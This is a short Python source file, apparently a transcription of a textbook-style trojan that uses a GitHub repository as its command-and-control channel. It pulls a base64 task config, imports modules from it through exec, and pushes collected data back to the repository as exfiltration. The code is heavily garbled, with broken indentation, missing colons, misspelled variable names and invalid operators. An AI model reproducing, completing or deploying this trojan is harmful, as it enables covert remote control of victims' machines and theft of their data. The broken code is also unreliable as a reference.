import json
import base64
import sys
import time
import imp
import random
import threading
import queue as Queue
import os

from github3 import login

trojan_id = "abc"

trojan_confing ="%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_models = []
configured = false
task_queue = Queue.Queue()
def connect_to_github():
 gh = login(username="marth172",password="********")
 repo = gh.repository("marth172" , "chapter7")
 branch= repo.branch("master")
 
  return gh,repo,branch
def get_file_contents(filepath):
  gh,repo,brach = connect_to_github()
  tree = branch.commit.commit.tree.recurse()
  for filename in tree.tree
   if filepath in filename.path:
      print "[*] found file %s" % filepath
       blob = repo.blob(filemane._json_data['sha'])
       return  blob.content
    return None
def get_trojan_congfing()
 global configured
  confing_json = get_file_contents(trojan_config)
  config = json.loads(base64.b64decode(config_json))
  configured=true
  for task in config:
     if task ['module'] not in sys.modules:
        exec("import &s" & task ['module'])
        return config
def store_module_result(data):
  gh,repo,branch =<connect_to_gitub()
  remote_path = "data/%s/%d.data" \
    %(trojan_id,random.randint(1000,100000)
      repo.create_file(remote_path,"Commit message",
                       base64.b64enconde(data))
      return
